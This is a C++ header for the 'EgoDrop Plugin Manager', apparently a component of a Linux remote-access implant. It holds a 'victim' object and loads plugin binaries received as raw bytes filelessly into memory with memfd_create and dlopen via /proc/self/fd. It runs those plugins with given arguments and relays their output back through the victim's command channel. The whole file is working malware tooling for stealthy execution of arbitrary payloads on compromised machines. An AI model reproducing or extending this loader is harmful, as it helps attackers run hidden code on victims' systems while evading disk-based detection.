/*
Name: EgoDrop Plugin Manager
Author: ISSAC
*/

#pragma once

#include <iostream>
#include <unistd.h>
#include <unordered_map>
#include <memory>
#include <string>
#include <vector>
#include <dlfcn.h>
#include <atomic>

#include <sys/mman.h>

#include "clsVictim.hpp"
#include "clsPluginAPI.h"

class clsPluginMgr
{
public:
    //
    struct stPluginInstance
    {
        stPluginMeta meta; //Meta-data.

        void* handle;
        int fd;

        bool (*init)(stAgentAPI*);
        int (*run)(int, const char**);
        void (*cleanup)();
    };

private:
    std::unordered_map<std::string, std::unique_ptr<stPluginInstance>> m_plugins;
    stAgentAPI m_api;
    std::shared_ptr<clsVictim> m_victim = nullptr;

public:
    clsPluginMgr(std::shared_ptr<clsVictim> victim) noexcept
    {
        m_victim = victim;
        m_api.ctx = victim.get();

        m_api.send_result = [](void* ctx, int argc, const char** argv)
        {
            auto* v = static_cast<clsVictim*>(ctx);
            if (!v || argc <= 0)
                return;

            std::vector<std::string> ls = 
            {
                "plugin",
                "output",
            };

            for (int i = 0; i < argc; ++i)
                ls.emplace_back(argv[i]);

            v->fnSendCommand(ls);
        };

        clsTools::fnLogInfo("Init.");
    }

    ~clsPluginMgr() = default;

    std::unique_ptr<stPluginMeta> fnGetPluginMeta(std::string& szName)
    {
        auto it = m_plugins.find(szName);
        if (it == m_plugins.end())
            return nullptr;
        
        return std::make_unique<stPluginMeta>(it->second->meta);
    }

    bool fnLoadPlugin(const std::string& szName, const std::vector<uint8_t>& abBytes)
    {
        if (m_plugins.count(szName))
            return false;

        int fd = memfd_create(szName.c_str(), MFD_CLOEXEC);
        if (fd < 0)
            return false;

        if (write(fd, abBytes.data(), abBytes.size()) < 0)
        {
            close(fd);
            return false;   
        }

        lseek(fd, 0, SEEK_SET);

        char path[64];
        snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

        void* h = dlopen(path, RTLD_NOW);
        if (!h)
        {
            close(fd);
            return false;
        }
        
        auto get_meta = (const stPluginMeta*(*)())dlsym(h, "fnPluginGetMeta");
        if (!get_meta)
        {
            dlclose(h);
            close(fd);
            return false;
        }

        const stPluginMeta* meta = get_meta();
        if (meta->uAbiVersion != AGENT_ABI_VERSION)
        {
            dlclose(h);
            close(fd);
            return false;
        }

        if (m_plugins.count(meta->szName))
        {
            dlclose(h);
            close(fd);
            return false;
        }

        auto init = (bool(*)(stAgentAPI*))dlsym(h, "fnbPluginInit");
        auto run = (int(*)(int, const char**))dlsym(h, "fnPluginRun");
        auto cleanup = (void(*)())dlsym(h, "fnPluginCleanup");

        if (!init || !run || !cleanup)
        {
            dlclose(h);
            close(fd);
            return false;
        }

        if (!init(&m_api))
        {
            dlclose(h);
            close(fd);
            return false;
        }

        auto p = std::make_unique<stPluginInstance>();
        p->meta = *meta;
        p->handle = h;
        p->fd = fd;
        p->init = init;
        p->run = run;
        p->cleanup = cleanup;

        m_plugins[p->meta.szName] = std::move(p);
        return true;
    }

    bool fnRunPlugin(const std::string& szName, const std::vector<std::string>& args)
    {
        auto it = m_plugins.find(szName);
        if (it == m_plugins.end())
            return false;

        //Convert into C ABI. 
        std::vector<const char*> argv;
        argv.reserve(args.size());

        for (const auto&s : args)
            argv.push_back(s.c_str());
            
        it->second->run(static_cast<int>(argv.size()), argv.data());

        return true;
    }

    bool fnUnloadPlugin(const std::string& szName)
    {
        auto it = m_plugins.find(szName);
        if (it == m_plugins.end())
            return false;

        auto& p = it->second;

        p->cleanup();

        dlclose(p->handle);

        close(p->fd);

        m_plugins.erase(it);

        return true;
    }

    std::vector<stPluginMeta> fnListPlugins() const
    {
        std::vector<stPluginMeta> vPlugin;

        for (const auto& [szName, p] : m_plugins)
        {
            vPlugin.push_back(p->meta);
        }

        return vPlugin;
    }
};